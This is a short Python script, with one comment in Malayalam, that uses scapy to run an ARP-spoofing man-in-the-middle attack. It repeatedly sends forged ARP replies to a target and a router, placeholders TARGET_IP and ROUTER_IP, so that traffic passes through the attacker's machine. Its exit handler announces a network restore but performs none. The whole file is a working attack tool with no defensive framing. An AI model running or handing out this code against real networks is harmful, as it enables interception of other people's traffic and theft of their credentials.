import scapy.all as scapy
import time, sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# റിയൽ വേൾഡ് ലോജിക്: ടാർഗെറ്റിന്റെയും റൂട്ടറിന്റെയും ഇടയിൽ നിൽക്കുന്നു
try:
    while True:
        spoof("TARGET_IP", "ROUTER_IP")
        spoof("ROUTER_IP", "TARGET_IP")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Restoring Network...")
